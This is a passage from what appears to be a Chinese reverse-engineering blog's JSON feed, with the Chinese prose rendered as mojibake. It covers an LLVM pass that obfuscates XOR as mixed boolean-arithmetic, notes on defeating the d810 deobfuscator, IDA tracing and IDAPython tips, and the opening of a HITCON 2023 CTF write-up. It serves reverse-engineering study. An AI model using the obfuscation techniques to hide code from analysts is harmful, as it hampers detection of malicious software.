data-num=\"23\"></td><td><pre>    Instruction <span class=\"token operator\">*</span>NewValue <span class=\"token operator\">=</span> <span class=\"token class-name\">BinaryOperator</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">CreateSub</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOperand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateAdd</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOperand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                          Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateAdd</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                              Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateMul</span><span class=\"token punctuation\">(</span>Val2<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                                                Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateOr</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                                                    BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOperand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                                                    Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateNot</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                                                        BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOperand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>Val2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\">// æ›¿æ¢ï¼</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token function\">ReplaceInstWithInst</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>BB<span class=\"token punctuation\">,</span> Inst<span class=\"token punctuation\">,</span> NewValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    Changed <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>   </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token keyword\">return</span> Changed<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>test.cpp</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">78</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">67</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">int</span> c <span class=\"token operator\">=</span> <span class=\"token number\">34</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">int</span> d <span class=\"token operator\">=</span> <span class=\"token number\">45</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> e <span class=\"token operator\">=</span> <span class=\"token number\">99</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">int</span> result <span class=\"token operator\">=</span> a <span class=\"token operator\">^</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    result <span class=\"token operator\">^=</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    result <span class=\"token operator\">^=</span> d<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    result <span class=\"token operator\">^=</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    result <span class=\"token operator\">^=</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The result of 5 XOR operations is: %d\\n\"</span><span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a: %d\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b: %d\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c: %d\\n\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"d: %d\\n\"</span><span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"e: %d\\n\"</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>/usr/lib/llvm-17/bin/opt -load-pass-plugin ./libMYXor.so -passes=â€œmba-xorâ€ -S out.ll -o temp.ll</p>\n<p>clang-17 temp.ll -o temp# å¾—äºŒè¿›åˆ¶æ–‡ä»¶</p>\n<h4 id=\"d810å¯¹æŠ—ç›¸å…³\"><a class=\"markdownIt-Anchor\" href=\"#d810å¯¹æŠ—ç›¸å…³\">#</a> d810 å¯¹æŠ—ç›¸å…³</h4>\n<p>åƒ mbaadd è¿™ç§é’ˆå¯¹ç‰¹å®š byte æ•°æ®èŒƒå›´çš„ d810 é»˜è®¤è‡ªå¸¦çš„åæ··æ·†è§„åˆ™æ²¡æœ‰çš„å¼å­å¯ä»¥ï¼Œä½†æ‰¾åˆ°è¿™ç§å¼å­å°±è€ƒéªŒæ•°å­¦èƒ½åŠ›äº†â€¦</p>\n<p><img data-src=\"/images/image-20231225235540039.png\" alt=\"image-20231225235540039\"></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/09/21/IDA%E6%93%8D%E4%BD%9C%E3%81%AE%E6%9C%9D%E8%8A%B1%E5%A4%95%E6%8B%BE/",
            "url": "https://3cly.github.io/2023/09/21/IDA%E6%93%8D%E4%BD%9C%E3%81%AE%E6%9C%9D%E8%8A%B1%E5%A4%95%E6%8B%BE/",
            "title": "IDAæ“ä½œã®æœèŠ±å¤•æ‹¾",
            "date_published": "2023-09-21T10:12:32.000Z",
            "content_html": "<h1 id=\"trace-åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#trace-åˆ†æ\">#</a> Trace åˆ†æ</h1>\n<p>æ‰“å¼€èœå•é¡¹ [Debugger] -&gt; [Tracing] -&gt; [Tracing Options] é…ç½® Trace é€‰é¡¹<br>\nåœ¨å‡†å¤‡å¼€å§‹ Trace çš„æŒ‡ä»¤ä½ç½®è®¾ç½®æ–­ç‚¹ï¼Œå¹¶ä½¿è¯¥æ–­ç‚¹å‘½ä¸­<br>\nå¼€å¯ Traceï¼š[Debugger] -&gt; [Tracing] -&gt; [Instruction Tracing]<br>\n å¼€å¯åï¼Œå•æ­¥æ‰§è¡Œä¸€æ¡æŒ‡ä»¤ï¼Œå‘ç°å·²ç»æ‰§è¡Œçš„æŒ‡ä»¤å˜è‰²è¡¨ç¤ºå¼€å¯ Trace æˆåŠŸ<br>\næŒ‰ä¸‹ F9 ç»§ç»­è¿è¡Œï¼Œç›´åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹æ‰‹åŠ¨åœæ­¢ Trace æˆ–ç›´åˆ°ç¨‹åºç»“æŸ</p>\n<p>æŒ‡ä»¤çº§ Trace è®°å½•æ¯ä¸€æ¡æŒ‡ä»¤çš„æ‰§è¡Œæƒ…å†µ</p>\n<p>åŸºæœ¬å— trace</p>\n<p>å‡½æ•°çº§åˆ« trace</p>\n<p>å®æ“å»æ··æ·†</p>\n<p>å…ˆåœ¨å¼€å¤´ start ä¸‹äº†ä¸€ä¸ªæ–­ç‚¹</p>\n<p><img data-src=\"P:%5CHexo-Blog%5Csource%5Cimages%5Cimage-20230922145513874.png\" alt=\"image-20230922145513874\"></p>\n<p><img data-src=\"P:%5CHexo-Blog%5Csource%5Cimages%5Cimage-20230922145547232.png\" alt=\"image-20230922145547232\"></p>\n<p>è¿è¡Œèµ·æ¥åå³å¯ trace</p>\n<p><img data-src=\"P:%5CHexo-Blog%5Csource%5Cimages%5Cimage-20230922145742213.png\" alt=\"image-20230922145742213\"></p>\n<p>trace ä¼šæŠŠæ‰§è¡Œè¿‡çš„æŒ‡ä»¤æŸ“è‰² é€€å‡ºè°ƒè¯• èƒ½åœ¨ tracing window åˆ†æ trace çš„ç»“æœ</p>\n<p><img data-src=\"P:%5CHexo-Blog%5Csource%5Cimages%5Cimage-20230922145842252.png\" alt=\"image-20230922145842252\"></p>\n<p>é€šè¿‡ trace æ‰¾åˆ°å †æ ˆå¹³è¡¡ç‚¹ å°±èƒ½ç¡®å®šèŠ±æŒ‡ä»¤åŒºé—´ç„¶åå»é™¤</p>\n<p>result æ˜¯å½“å‰æŒ‡ä»¤æ‰§è¡Œåï¼Œè¢«ä¿®æ”¹çš„å¯„å­˜å™¨åˆ—è¡¨åŠå¯¹åº”çš„å€¼</p>\n<h1 id=\"fork-åŒè¿›ç¨‹è°ƒè¯•\"><a class=\"markdownIt-Anchor\" href=\"#fork-åŒè¿›ç¨‹è°ƒè¯•\">#</a> Fork åŒè¿›ç¨‹è°ƒè¯•</h1>\n<p>å°†å­è¿›ç¨‹çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ patch ä¸ºæ­»å¾ªç¯ (è¿™æ ·å­è¿›ç¨‹å°±åœ¨æ­»å¾ªç¯çš„ç­‰å¾…çŠ¶æ€)</p>\n<p><img data-src=\"P:%5CHexo-Blog%5Csource%5Cimages%5Cimage-20230922160814049.png\" alt=\"image-20230922160814049\"> é‡æ–°æ‰“å¼€å¦å¤–ä¸€ä¸ª IDAï¼Œé™„åŠ å­è¿›ç¨‹ï¼Œæ¢å¤ç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Œè°ƒè¯•<br>\n (ä¹Ÿå¯ä»¥ patch æˆæ­»å¾ªç¯å detach å†é‡æ–° attach å­è¿›ç¨‹ ç„¶å set IP è·³å‡ºæ­»å¾ªç¯å³å¯)</p>\n<p>å½“ç„¶ï¼Œå¦‚æœ fork çš„è¿›ç¨‹ä¸åŸè¿›ç¨‹ä¸å­˜åœ¨äº¤äº’ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ set IP æ‰§è¡Œå­è¿›ç¨‹çš„ä»£ç æ¥è°ƒè¯•</p>\n<p>è¿™ä¸ªæŠ€å·§é€‚ç”¨äºæ‰€æœ‰æ— æ³•ç›´æ¥å¯åŠ¨è°ƒè¯•ï¼Œè€Œåªèƒ½é™„åŠ çš„åœºæ™¯</p>\n<h1 id=\"ida-python\"><a class=\"markdownIt-Anchor\" href=\"#ida-python\">#</a> IDA Python</h1>\n<p>å¯„å­˜å™¨æ“ä½œ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>idc<span class=\"token punctuation\">.</span>get_reg_value<span class=\"token punctuation\">(</span>'raxâ€™<span class=\"token punctuation\">)</span> <span class=\"token comment\">#è¯»å–</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>idaapi<span class=\"token punctuation\">.</span>set_reg_val<span class=\"token punctuation\">(</span><span class=\"token string\">\"rax\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1234</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#è®¾ç½®</span></pre></td></tr></table></figure><p>è¯»å– xmm å¯„å­˜å™¨ (å¾ˆå°‘é‡åˆ°)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">read_xmm_reg</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>â€‹       rv <span class=\"token operator\">=</span> idaapi<span class=\"token punctuation\">.</span>regval_t<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>â€‹       idaapi<span class=\"token punctuation\">.</span>get_reg_val<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> rv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>â€‹       <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>struct<span class=\"token punctuation\">.</span>unpack<span class=\"token punctuation\">(</span><span class=\"token string\">'Q'</span><span class=\"token punctuation\">,</span> rv<span class=\"token punctuation\">.</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>è°ƒè¯•å†…å­˜æ“ä½œ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>idc<span class=\"token punctuation\">.</span>read_dbg_byte<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>idc<span class=\"token punctuation\">.</span>read_dbg_memory<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>idc<span class=\"token punctuation\">.</span>read_dbg_dword<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>idc<span class=\"token punctuation\">.</span>read_dbg_qword<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>idc<span class=\"token punctuation\">.</span>patch_dbg_byte<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>è°ƒè¯•å†…å­˜è¯»å†™å°è£…</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">patch_dbg_mem</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>â€‹       <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>â€‹             idc<span class=\"token punctuation\">.</span>patch_dbg_byte<span class=\"token punctuation\">(</span>addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">read_dbg_mem</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>â€‹       dd <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span> <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>â€‹       <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>â€‹             dd<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>idc<span class=\"token punctuation\">.</span>read_dbg_byte<span class=\"token punctuation\">(</span>addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>â€‹        <span class=\"token keyword\">return</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>dd<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>æœ¬åœ°å†…å­˜æ“ä½œï¼ˆä¼šä¿®æ”¹ idb æ•°æ®åº“ï¼‰</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>idc<span class=\"token punctuation\">.</span>get_qword<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>idc<span class=\"token punctuation\">.</span>patch_qword<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>idc<span class=\"token punctuation\">.</span>patch_dword<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>idc<span class=\"token punctuation\">.</span>patch_word<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>idc<span class=\"token punctuation\">.</span>patch_byte<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>idc<span class=\"token punctuation\">.</span>get_db_byte<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>idc<span class=\"token punctuation\">.</span>get_bytes<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>åæ±‡ç¼–æ“ä½œ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>GetDisasm<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># è·å–åæ±‡ç¼–æ–‡æœ¬</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>idc<span class=\"token punctuation\">.</span>next_head<span class=\"token punctuation\">(</span>ea<span class=\"token punctuation\">)</span> <span class=\"token comment\"># è·å–ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€</span></pre></td></tr></table></figure><p>æ‚é¡¹å¸¸ç”¨æ¥å£</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>idc<span class=\"token punctuation\">.</span>add_bpt<span class=\"token punctuation\">(</span><span class=\"token number\">0x409437</span><span class=\"token punctuation\">)</span> æ·»åŠ æ–­ç‚¹</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>idaapi<span class=\"token punctuation\">.</span>get_imagebase<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> è·å–åŸºåœ°å€</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>idc<span class=\"token punctuation\">.</span>create_insn<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># c, Make Code</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>ida_funcs<span class=\"token punctuation\">.</span>add_func<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># p , create function</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ida_bytes<span class=\"token punctuation\">.</span>create_strlit<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># åˆ›å»ºå­—ç¬¦ä¸²ï¼ŒA é”®æ•ˆæœ</span></pre></td></tr></table></figure><p>æ¡ä»¶æ–­ç‚¹è„šæœ¬ç¼–å†™</p>\n<ol start=\"0\">\n<li>\n<p>ç¼–å†™æ–­ç‚¹å‡½æ•°è„šæœ¬ï¼Œå¹¶åœ¨ IDA åº•éƒ¨å¯¼å…¥è¯¥å‡½æ•°</p>\n</li>\n<li>\n<p>è®¾ç½®æ™®é€šæ–­ç‚¹ï¼Œåœ¨ call rand ä¹‹åè®¾ç½®ï¼ˆæ­¤æ—¶èƒ½è·å– rand çš„è¿”å›å€¼ï¼‰</p>\n</li>\n<li>\n<p>[å³é”®] -&gt; [Edit Break â€¦]</p>\n</li>\n<li>\n<p>ç‚¹å‡» [Condition]-&gt;  [â€¦]</p>\n</li>\n<li>\n<p>è¾“å…¥ bp () ï¼Œå¹¶é€‰æ‹©è¯­è¨€ä¸º Python</p>\n</li>\n</ol>\n<p>æ¡ä»¶æ–­ç‚¹è¿ç”¨ï¼šæå– rand å‡½æ•°æ¯ä¸€æ¬¡æ‰§è¡Œç»“æœï¼Œä¸è®©ç¨‹åºåœä¸‹æ¥<br>\næ¡ä»¶æ–­ç‚¹å‡½æ•°è¿”å› Falseï¼ŒIDA ä¸ä¼šå‘½ä¸­è¯¥æ–­ç‚¹<br>\nåˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¯æå–è¿è¡Œæ—¶æ•°æ®</p>\n<p>æ³¨ï¼šè‹¥è®¾ç½®æ¡ä»¶æ–­ç‚¹ åœ¨ idapython è„šæœ¬ä¸­æœªè®¾ç½®æ–­ä¸‹æ¥çš„æ¡ä»¶ (é€šä¿—çš„è¯´æ³•), åªæ˜¯ print çš„è¯è¿è¡Œæ—¶æ˜¯ä¸ä¼šæ–­çš„</p>\n<p><strong>åˆ›å»ºç»“æ„ä½“</strong></p>\n<p>æ‰“å¼€åˆ›å»ºç»“æ„ä½“çš„ Subviewï¼Œç‚¹å‡»å·¥å…·æ  View-&gt;Open Subview-&gt;Structures ( <strong>Shift + F9</strong>)ã€‚</p>\n<p>æŒ‰é”®ç›˜ I å¼¹å‡ºç»“æ„ä½“çš„åˆ›å»ºçª—å£ï¼Œè¾“å…¥ Structure nameã€‚</p>\n<p>åœ¨ç»“æ„ä½“çš„ ends è¡Œï¼ŒæŒ‰é”®ç›˜  <code>d</code>  é”®ï¼Œåˆ›å»ºæ–°çš„ç»“æ„ä½“æˆå‘˜ã€‚</p>\n<p>åœ¨ç»“æ„ä½“æˆå‘˜åˆæŒ‰  <code>d</code>  é”®ï¼Œä¿®æ”¹æ•°æ®ç±»å‹ï¼ˆdb dw dd dqï¼‰ï¼Œå³é”®ç‚¹å‡» Array å¯ä»¥åˆ›å»ºæ•°ç»„ã€‚</p>\n<p>æœ€åï¼Œåˆ†æä»£ç ã€‚ç¡®å®šç»“æ„ä½“ä¸­çš„æˆå‘˜åœ¨åæ±‡ç¼–ä»£ç ä¸­çš„åç§°ã€‚ä¹‹åï¼Œä¿®æ”¹åç¼–è¯‘ä»£ç ä¸­è¯¥ æˆå‘˜çš„ç±»å‹ï¼ŒæŒ‰  <code>y</code>  ä¿®æ”¹ä¸º struct nameï¼ˆè¿™é‡Œä¿®æ”¹ä¸º studentï¼‰ã€‚</p>\n<p><strong>Local Types</strong> ä¿®æ”¹æ–¹ä¾¿ï¼</p>\n<p>å‚è€ƒ:<span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGlua3ljeC5tZS8yMDE5LTA3LTE1LWhvdy10by1jcmVhdGUtc3RydWN0cy1pbi1JREEuaHRtbA==\">https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html</span></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/09/11/hitcon2023%E9%80%86%E5%90%91-The-Blade-WP/",
            "url": "https://3cly.github.io/2023/09/11/hitcon2023%E9%80%86%E5%90%91-The-Blade-WP/",
            "title": "hitcon2023é€†å‘ The Blade WP",
            "date_published": "2023-09-10T16:35:32.000Z",
            "content_html": "<h1 id=\"hitcon2023é€†å‘-the-blade-wp\"><a class=\"markdownIt-Anchor\" href=\"#hitcon2023é€†å‘-the-blade-wp\">#</a> hitcon2023 é€†å‘ The Blade WP</h1>\n<p><img data-src=\"/images/image-20230908230559788.png\" alt=\"image-20230908230559788\"></p>\n<p>è¿è¡Œæ‰€ç»™çš„ç¨‹åº socket é€šä¿¡ç›¸å…³</p>\n<p><img data-src=\"/images/image-20230909162510993.png\" alt=\"image-20230909162510993\"></p>\n<p><img data-src=\"/images/image-20230910145732886.png\" alt=\"image-20230910145732886\"></p>\n<p>ç”±é¢˜ç›®æè¿° A Rust tool for executing shellcode in a seccomp environment.</p>\n<p>å­—ç¬¦ä¸²æŸ¥æ‰¾å®šä½ å‘ç°å…¶ä¸­ verify æ–¹æ³•å¯ç–‘</p>\n<p><img data-src=\"/images/image-20230910150509237.png\" alt=\"image-20230910150509237\"></p>\n<p>å‘ç°éšè—äº†ä¸€ä¸ªå‘½ä»¤ flag æ˜¯ä»¥æ·»åŠ å‘½ä»¤è¡Œå‚æ•°çš„æ–¹å¼è¾“å…¥ flag è°ƒè¯•å¾—çŸ¥è¾“å…¥ flag é•¿åº¦ä¸º 64 ä½</p>\n<p><img data-src=\"/images/image-20230909181940256.png\" alt=\"image-20230909181940256\"></p>\n<p>F7 è¿›å…¥ verify å‘ç°åŠ å¯†é€»è¾‘ ç®€å•æ¥è®² æ˜¯ä¸€ä¸ªå¤§çš„ 256 æ¬¡ while å¾ªç¯ é‡Œé¢æœ‰å¥½å‡ ä¸ªé€šè¿‡å›ºå®šçš„è¡¨å¯¹è¾“å…¥è¿›è¡Œæ‰“ä¹±ï¼Œç„¶åä¸€ä¸ªæœ‰ç‚¹å¤æ‚çš„åŠ 